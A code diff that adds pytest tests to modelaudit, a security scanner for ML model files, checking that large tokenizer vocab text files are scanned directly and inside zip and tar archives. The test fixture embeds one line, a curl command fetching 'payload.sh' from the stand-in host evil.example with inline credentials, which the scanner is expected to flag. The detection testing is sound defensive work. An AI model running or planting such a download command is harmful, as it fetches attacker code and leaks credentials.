@@ -22,6 +22,7 @@ import pytest
 
 from modelaudit import core as core_module
 from modelaudit.core import _is_huggingface_cache_file, determine_exit_code, scan_file, scan_model_directory_or_file
+from modelaudit.models import ModelAuditResultModel
 from modelaudit.utils.file import detection as file_detection
 from modelaudit.utils.file.detection import (
     _CONTENT_ROUTE_TEXT_OWNER_COMPLETE_BYTES,
@@ -121,6 +122,32 @@ def _bpe_merges_text(min_bytes: int = 3 * 1024 * 1024) -> str:
         total_bytes += len(line) + 1
         index += 1
     return "\n".join(lines) + "\n"
+
+
+def _tokenizer_vocab_text_with_basic_auth(min_bytes: int = 3 * 1024 * 1024) -> str:
+    lines = [
+        "[PAD]",
+        "[UNK]",
+        "[CLS]",
+        "[SEP]",
+        "[MASK]",
+        "curl https://user:credential-secret@evil.example/payload.sh",
+    ]
+    total_bytes = sum(len(line) + 1 for line in lines)
+    index = 0
+    while total_bytes <= min_bytes:
+        line = f"token_{index}"
+        lines.append(line)
+        total_bytes += len(line) + 1
+        index += 1
+    return "\n".join(lines) + "\n"
+
+
+def _has_evil_example_text_security_finding(results: ModelAuditResultModel, location: str) -> bool:
+    return any(
+        issue.location == location and "evil.example" in f"{issue.message} {issue.details}".lower()
+        for issue in results.issues
+    )
 
 
 def _large_model_card_text(min_bytes: int = 3 * 1024 * 1024) -> str:
@@ -721,6 +748,26 @@ class TestDirectoryFileFiltering:
         assert "flax_msgpack_routing_incomplete" not in metadata.get("scan_outcome_reasons", [])
         assert not any(check.name == "MessagePack Routing Analysis Incomplete" for check in results.checks)
 
+    @pytest.mark.parametrize("filename", ["tokenizer_vocab.txt", "tokenizer-vocab.txt"])
+    def test_large_tokenizer_vocab_alias_scans_text_security_in_directory_scan(
+        self,
+        tmp_path: Path,
+        filename: str,
+    ) -> None:
+        vocab = tmp_path / filename
+        vocab.write_text(_tokenizer_vocab_text_with_basic_auth(), encoding="utf-8")
+
+        assert vocab.stat().st_size > file_detection._CONTENT_ROUTE_PRINTABLE_TEXT_FAST_PATH_BYTES
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results.files_scanned == 1
+        assert results.scanner_names == ["text"]
+        assert determine_exit_code(results) == 1
+        metadata = results.file_metadata[str(vocab)].model_dump(mode="python")
+        assert metadata["scanner_dependency_ids"] == ["text"]
+        assert _has_evil_example_text_security_finding(results, str(vocab))
+
     def test_large_merges_text_stays_on_text_route_inside_zip_member(self, tmp_path: Path) -> None:
         payload = _bpe_merges_text().encode("utf-8")
         archive = tmp_path / "tokenizer.zip"
@@ -739,6 +786,30 @@ class TestDirectoryFileFiltering:
         ]
         assert "flax_msgpack_routing_incomplete" not in metadata.get("scan_outcome_reasons", [])
         assert not any(check.name == "MessagePack Routing Analysis Incomplete" for check in results.checks)
+
+    @pytest.mark.parametrize("filename", ["tokenizer_vocab.txt", "tokenizer-vocab.txt"])
+    def test_large_tokenizer_vocab_alias_scans_text_security_inside_zip_member(
+        self,
+        tmp_path: Path,
+        filename: str,
+    ) -> None:
+        payload = _tokenizer_vocab_text_with_basic_auth().encode("utf-8")
+        archive = tmp_path / "tokenizer.zip"
+        member_name = f"tokenizer/{filename}"
+        with zipfile.ZipFile(archive, "w") as zip_archive:
+            zip_archive.writestr(member_name, payload)
+
+        assert len(payload) > file_detection._CONTENT_ROUTE_PRINTABLE_TEXT_FAST_PATH_BYTES
+
+        results = scan_model_directory_or_file(str(archive), cache_scan_results=False)
+
+        assert results.files_scanned == 1
+        assert results.scanner_names == ["zip"]
+        assert determine_exit_code(results) == 1
+        metadata = results.file_metadata[str(archive)].model_dump(mode="python")
+        assert metadata["scanner_dependency_ids"] == ["zip", "text"]
+        assert metadata["contents"] == [{"path": f"{archive}:{member_name}", "type": "text", "size": len(payload)}]
+        assert _has_evil_example_text_security_finding(results, f"{archive}:{member_name}")
 
     def test_large_merges_text_stays_on_text_route_inside_tar_member(self, tmp_path: Path) -> None:
         payload = _bpe_merges_text().encode("utf-8")
@@ -760,6 +831,32 @@ class TestDirectoryFileFiltering:
         ]
         assert "flax_msgpack_routing_incomplete" not in metadata.get("scan_outcome_reasons", [])
         assert not any(check.name == "MessagePack Routing Analysis Incomplete" for check in results.checks)
+
+    @pytest.mark.parametrize("filename", ["tokenizer_vocab.txt", "tokenizer-vocab.txt"])
+    def test_large_tokenizer_vocab_alias_scans_text_security_inside_tar_member(
+        self,
+        tmp_path: Path,
+        filename: str,
+    ) -> None:
+        payload = _tokenizer_vocab_text_with_basic_auth().encode("utf-8")
+        archive = tmp_path / "tokenizer.tar"
+        member_name = f"tokenizer/{filename}"
+        member = tarfile.TarInfo(member_name)
+        member.size = len(payload)
+        with tarfile.open(archive, "w") as tar_archive:
+            tar_archive.addfile(member, io.BytesIO(payload))
+
+        assert len(payload) > file_detection._CONTENT_ROUTE_PRINTABLE_TEXT_FAST_PATH_BYTES
+
+        results = scan_model_directory_or_file(str(archive), cache_scan_results=False)
+
+        assert results.files_scanned == 1
+        assert results.scanner_names == ["tar"]
+        assert determine_exit_code(results) == 1
+        metadata = results.file_metadata[str(archive)].model_dump(mode="python")
+        assert metadata["scanner_dependency_ids"] == ["tar", "text"]
+        assert metadata["contents"] == [{"path": f"{archive}:{member_name}", "type": "text", "size": len(payload)}]
+        assert _has_evil_example_text_security_finding(results, f"{archive}:{member_name}")
 
     def test_large_nested_readme_stays_on_text_route_inside_zip_member(self, tmp_path: Path) -> None:
         payload = _large_model_card_text().encode("utf-8")
